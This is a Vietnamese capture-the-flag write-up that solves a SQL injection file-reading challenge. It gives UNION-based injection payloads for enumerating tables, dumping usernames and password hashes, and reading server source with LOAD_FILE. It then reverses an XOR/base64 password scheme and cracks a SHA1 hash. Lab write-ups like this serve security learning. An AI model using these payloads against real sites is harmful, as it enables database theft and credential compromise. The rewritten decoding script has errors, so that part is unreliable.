# Challenge: SQL injection - Lecture de fichiers

<img width="1501" height="509" alt="image" src="https://github.com/user-attachments/assets/370bdf6e-0bc3-49dd-ba5a-0388a7057a17" />

Vào Challenge thì cho một giao diện như vậy

<img width="477" height="156" alt="image" src="https://github.com/user-attachments/assets/329402aa-9c8c-4451-8537-4c2ae761a7bc" />

Tương tự như những bài khác thì Login chả có gì cả 

Vào tab  Members thì có một link ở đó cho xem profile admin bằng cách tham số id nhận giá trị truyền vào từ bên ngoài rồi thực hiện truy vấn SQL và kết quả trả về từ truy vấn nó sẽ hiển thị ra màn hình

Mình thử truyền vào `10000 or 1=1 -- -` 

<img width="1164" height="324" alt="image" src="https://github.com/user-attachments/assets/03e209cd-f090-4dde-b7e9-f6f65b264115" />

Nó vẫn hiển thị thông tin admin

Tiếp theo Xác định số cột bằng 4 

<img width="1490" height="316" alt="image" src="https://github.com/user-attachments/assets/727dfa02-7a5e-49ef-8c60-64209fde32df" />

```sql
1000 union select 1,table_name,3,4 from information_schema.tables where table_schema = DATABASE() limit 1 offset 0 -- -
```

<img width="1498" height="374" alt="image" src="https://github.com/user-attachments/assets/e177b12b-f4da-49ef-91ea-d05fd75f6f15" />


Xác định cột
```sql
1000 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema = DATABASE() and table_name = 0x6D656D626572  -- -
```
<img width="1492" height="320" alt="image" src="https://github.com/user-attachments/assets/e07ccd93-3ab8-42be-846a-01b5a351caad" />

Xác định password

```sql
1000 union select 1,group_concat(member_login),3,group_concat(member_password) from member  -- -
```
<img width="1490" height="340" alt="image" src="https://github.com/user-attachments/assets/7dcde1fc-bb43-47a9-b1b7-ead557229807" />

```
VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==
```

Thử lấy password đó login admin nhưng bao nhiêu lần nó vẫn báo vậy

<img width="438" height="160" alt="image" src="https://github.com/user-attachments/assets/a44c355f-5cdb-4ec5-bf69-305e0ee3b37e" />

Đây không phải password riel !!! Mình thử decode hex nó ra coi có được gì không nhưng vẫn không được . 

Lúc này dựa vào hint từ Challenge , cái Đọc file mình chưa dùng tới , vậy là chúng ta cần đọc một file gì đó ở đây để biết được password riel 

Nhưng muốn đọc được file chúng ta cần biết được đường dẫn , muốn có đường dẫn thì thử làm nó hiển thị lỗi xem sao . Vì đã biết được DBMS ở đây MariaDB thì cứ hỏi chatgpt hệ quản trị csdl này hiển thị lỗi đường dẫn khi nào . Bạn phải gây ra lỗi ở phía backend , nó sẽ in ra lỗi ở dòng nào , ở file nào , đường dẫn nào . 

Lưu ý ở đây phải là ở phía back end chứ không phải là ở phía DB đâu nha . Nếu bạn thêm dấu nháy đơn ở câu truy phá vỡ cấu trúc thì nó chỉ là lỗi ở DB thôi . Hãy phân biệt điều đó

Bạn cứ thêm kí hiệu mảng vào sau chữ id kia , nó sẽ báo lỗi ở backend 

<img width="1481" height="312" alt="image" src="https://github.com/user-attachments/assets/7f16cc26-575c-4486-a220-98e62d53341f" />

Như bạn thấy đó , đã hiện ra đường dẫn kia rồi , giờ sử dụng hàm `LOAD_FILE('ĐƯỜNG_DẪN')` 

Đường dẫn là
```
/challenge/web-serveur/ch31/index.php
```
Payload 
```sql
1000 union select 1,LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),3,4 -- -
```
Kết quả là:

<img width="1880" height="749" alt="image" src="https://github.com/user-attachments/assets/9232569c-7b04-44e8-a809-2a8fd5a7c795" />


Chúng ta được 2 đoạn code sau 
```php
<?php

define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');


function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
 

$GLOBALS["___mysqli_ston"] = mysqli_connect('', SQL_LOGIN, SQL_P, "", 0, SQL_HOST) or exit('mysql connection error !');
mysqli_select_db($GLOBALS["___mysqli_ston"], SQL_DB) or die("Database selection error !");

if ( ! isset($_GET['action']) ) $_GET['action']="login";

if($_GET['action'] == "login"){
        print '<form METHOD="POST">
                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
                <p><input value=submit type=submit /></p>
                </form>';

	if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
	{
		$user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], strtolower($_POST['username']));
		$pass = sha1($_POST['password']);
		
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
		if(mysqli_num_rows($result) == 1)
		{
			$data = mysqli_fetch_array($result);
			if($pass == stringxor($key, base64_decode($data['member_password']))){
                                // authentication success
                                print "<p>Authentication success !!</p>";
                                if ($user == "admin")
                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
                                else 
                                    print "<p>But... you're not admin !</p>";
			}
			else{
                                // authentication failed
				print "<p>Authentication failed !</p>";
			}
		}
		else{
			print "<p>User not found !</p>";
		}
	}
}

if($_GET['action'] == "members"){
	if(isset($_GET['id']) && !empty($_GET['id']))
	{
                // secure ID variable
		$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET['id']);
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member WHERE member_id=$id") or die(mysqli_error($GLOBALS["___mysqli_ston"]));
		
		if(mysqli_num_rows($result) == 1)
		{
			$data = mysqli_fetch_array($result);
			print "ID : ".$data["member_id"]."<br />";
			print "Username : ".$data["member_login"]."<br />";
			print "Email : ".$data["member_email"]."<br />";	
		}
                else{
                        print "no result found";
                }
	}
	else{
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member");
		while ($row = mysqli_fetch_assoc($result)) {
			print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
		}
	}
}

?>
```

Ở đây chúng ta thấy được cái password nhập vào , nó được so sánh với password trong database được decode base64 ra rồi bỏ vào hàm stringxor() và so sánh với password bên ngoài , vậy thì cái password lúc đầu của chúng ta lấy được trong database bảo sao mà không đúng , nó đã được encode các thứ rồi 

Decode base64 ra ta được : `VkE1UUExY0NWUWdQWHdFQVh3WlZWVnNIQmd0ZlVWQmFWMVFFQXdJRlZBSldBd0JSQzF0UlZBPT0=`

Viết lại 
```php
<?php
$key = c92fcd618967933ac463feb85ba00d5a7ae52842;
$password = VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==;
$password_decode = base64_decode($password);
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}
$result = string($key, $password_decode);
echo $result;
?>
```
Kết quả chúng ta có
```
77be4fc97f77f5f48308942bb6e32aacabed9cef
```
Nhưng chưa hết 
```php
$pass = sha1($_POST['password']);
```
Password nhập vào lại bị mã hóa thành sha1 , vậy tức là lúc này để lấy lại mật khẩu đúng thì phải bẻ được cái mã hóa sha1 ấy . Bạn vào `https://crackstation.net/` , bỏ cái kết quả chúng ta tìm được kia vào trong và Crash . Nó sẽ so sánh cái mã sha1 kia với tất cả các mã có sẵn trong kho mã của nó , nếu có cái nào khớp thì trả về kết quả . CHứ chúng ta không thể decode được bởi vì không có key để code

Kết quả là:
```
superpassword
```

D0ne Challenge này nhé !!


